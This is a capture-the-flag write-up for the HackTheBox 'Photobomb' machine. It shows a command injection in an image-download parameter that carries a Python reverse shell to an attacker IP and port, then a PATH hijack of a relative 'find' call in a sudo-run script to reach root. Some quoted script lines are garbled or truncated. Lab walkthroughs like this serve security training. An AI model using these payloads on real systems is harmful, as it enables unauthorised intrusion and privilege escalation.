---
title: Photobomb Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

In the source code of the page the src= points to a .js file from where we get the link to access the next page.

If we download an image and intercept the request through your bursuite 

```sql
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=jpg&dimensions=3000x2000
```

We can see as if modifying the format jpg/png the page gives error, because it processes in the backend this request to see if format = jpg | format = png, reason why it is possible to put a reverse shell by this means.

we put the reverse shell but PRESERVING THE DOWNLOAD FORMAT

```sql
photo=voicu-apostol-MWER49YaD-M-unsplash.jpg&filetype=png%26python3+-c+'import+os,pty,socket%3bs%3dsocket.socket()%3bs. connect(("10.10.14.12",4444))%3b[os.dup2(s.fileno(),f)for+f+in(0,1,2)]%3bpty.spawn("sh")'&dimensions=1000x100x0
```

And as LD_PRELOAD can be executed as root, then we put it in the .c file to become root.

On the other hand

```shell
/bin/bash
. /opt/.bashrc
cd /home/wizard/photobomb

# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ] && !
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi

# protect the priceless originals
find source_images -type f -name '*.jpg' -exec chown root:root {} {};
```

we can see that it uses find relatively and not the absolute path.

We can take advantage of the fact that we can change variables such as the path to take a custom find command, and under the sudo context our find will run as root

For this we will create a bash-valid find file and give it execution permissions

```shell
wizard@photobomb:~$ echo bash > find
wizard@photobomb:~$ chmod +x find 
wizard@photobomb:~$ chmod +x find
```

Now changing the path variable we run the script and get root

```shell
wizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:~# id
uid=0(root) gid=0(root) groups=0(root)
root@photobomb:~# hostname -I
10.10.11.182 dead:beef::250:56ff:feb9:240a 
```

